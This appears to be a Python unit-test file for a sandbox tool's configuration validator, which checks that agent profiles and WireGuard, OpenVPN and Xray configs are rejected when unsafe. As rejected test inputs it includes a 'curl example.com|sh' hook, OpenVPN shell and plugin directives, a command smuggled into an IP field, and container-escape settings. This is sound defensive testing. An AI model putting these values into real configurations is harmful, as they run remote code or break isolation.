import copy
import json
import tempfile
import unittest
from pathlib import Path
from agentboxlib.config import validate, validate_vpn, save, load


def profile():
    return {'name':'demo','agent':{'image':'agentbox-agent:local','cli':['bash'],'gui':['chromium','--ozone-platform=x11']},'vpn':{'kind':'wireguard','config':'vpn.conf','endpoints':[{'ip':'8.8.8.8','port':51820,'protocol':'udp'}]},'mode':'cli'}


class Profiles(unittest.TestCase):
    def test_valid_profile_normalizes_without_inheriting_host(self):
        p=validate(profile())
        self.assertEqual(p['name'],'demo')
        self.assertEqual(p['dns'],'1.1.1.1')
        self.assertNotIn('environment',p['agent'])
    def test_dangerous_fields_rejected(self):
        for key,value in [('volumes',['/:/host']),('privileged',True),('network_mode','host'),('environment',{'TZ':'Europe/Moscow'})]:
            p=profile(); p['agent'][key]=value
            with self.subTest(key=key), self.assertRaises(ValueError): validate(p)
    def test_unsafe_endpoints_and_names_rejected(self):
        for ip in ['127.0.0.1','10.2.3.4','169.254.169.254','::1','example.org','8.8.8.8;id']:
            p=profile();p['vpn']['endpoints'][0]['ip']=ip
            with self.subTest(ip=ip), self.assertRaises(ValueError): validate(p)
        for name in ['../claude','claude-isolated','a\nb','']:
            p=profile();p['name']=name
            with self.assertRaises(ValueError): validate(p)
    def test_booleans_and_bad_commands_rejected(self):
        p=profile();p['vpn']['endpoints'][0]['port']=True
        with self.assertRaises(ValueError):validate(p)
        for cmd in ['bash',[],['bash\x00']]:
            p=profile();p['agent']['cli']=cmd
            with self.assertRaises(ValueError):validate(p)
    def test_save_is_private_and_refuses_overwrite(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'profile.json';save(path,profile())
            self.assertEqual(path.stat().st_mode & 0o777,0o600)
            self.assertEqual(load(path)['name'],'demo')
            with self.assertRaises(FileExistsError):save(path,profile())
    def test_wireguard_no_hooks_or_endpoint_dns(self):
        safe=b'[Interface]\nPrivateKey = test\nAddress = 10.8.0.2/32\n[Peer]\nPublicKey = test\nAllowedIPs = 0.0.0.0/0\nEndpoint = 8.8.8.8:51820\n'
        eps=profile()['vpn']['endpoints']
        validate_vpn('wireguard',safe,eps)
        for addition in [b'PostUp = curl example.com|sh\n',b'DNS = 8.8.8.8\n',b'Include = other.conf\n']:
            with self.assertRaises(ValueError):validate_vpn('wireguard',safe+addition,eps)
        with self.assertRaises(ValueError):validate_vpn('wireguard',safe.replace(b'8.8.8.8:51820',b'vpn.test:51820'),eps)
    def test_openvpn_no_scripts_plugins_or_nested_config(self):
        eps=[{'ip':'8.8.8.8','port':1194,'protocol':'udp'}]
        safe=b'client\ndev tun0\nproto udp\nremote 8.8.8.8 1194\nremote-cert-tls server\n<ca>\ntest\n</ca>\n'
        validate_vpn('openvpn',safe,eps)
        for addition in [b'up /bin/sh\n',b'plugin /tmp/x.so\n',b'config other.conf\n',b'log /host/test\n',b'auth-user-pass /host/file\n']:
            with self.subTest(addition=addition), self.assertRaises(ValueError):validate_vpn('openvpn',safe+addition,eps)
    def test_xray_no_direct_or_unlisted_endpoint(self):
        eps=[{'ip':'8.8.8.8','port':443,'protocol':'tcp'}]
        cfg={'outbounds':[{'protocol':'vless','settings':{'vnext':[{'address':'8.8.8.8','port':443,'users':[{'id':'test','encryption':'none'}]}]}}]}
        validate_vpn('xray',json.dumps(cfg).encode(),eps)
        cfg['outbounds'].append({'protocol':'freedom'})
        with self.assertRaises(ValueError):validate_vpn('xray',json.dumps(cfg).encode(),eps)
    def test_openvpn_tabs_do_not_bypass_endpoint_allowlist(self):
        eps=[{'ip':'8.8.8.8','port':1194,'protocol':'udp'}]
        raw=b'client\ndev tun0\nproto udp\nremote\t1.1.1.1\t1194\nremote-cert-tls server\n'
        with self.assertRaises(ValueError):validate_vpn('openvpn',raw,eps)
    def test_openvpn_tabbed_valid_config_accepted(self):
        raw=b'client\ndev tun0\nproto\tudp\nremote\t8.8.8.8\t1194\nremote-cert-tls server\n'
        validate_vpn('openvpn',raw,[{'ip':'8.8.8.8','port':1194,'protocol':'udp'}])
